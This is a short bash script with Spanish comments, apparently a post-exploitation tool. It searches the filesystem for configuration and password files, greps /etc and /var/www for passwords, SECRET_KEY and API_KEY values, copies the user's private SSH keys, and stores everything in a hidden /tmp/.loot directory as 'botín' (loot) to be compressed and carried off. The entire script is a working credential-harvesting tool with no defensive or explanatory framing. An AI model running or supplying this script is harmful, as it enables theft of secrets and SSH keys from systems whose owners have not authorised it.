#!/bin/bash

DEST="/tmp/.loot"
mkdir -p "$DEST"

echo "[!] Buscando archivos de configuración y claves..."

# Buscar archivos con "config", "setup", "pwd", o "database" en el nombre
find / -type f \( -name "*config*" -o -name "*setup*" -o -name "*pwd*" \) 2>/dev/null | head -n 50 > "$DEST/interesantes.txt"

# Buscar archivos que contengan la palabra "password" o "SECRET_KEY"
grep -rE "password|SECRET_KEY|API_KEY" /etc /var/www 2>/dev/null | head -n 100 > "$DEST/claves_encontradas.txt"

# Robar llaves SSH privadas
cp -r ~/.ssh/* "$DEST/" 2>/dev/null

echo "[+] Botín guardado en $DEST. Comprímelo y sácalo de aquí."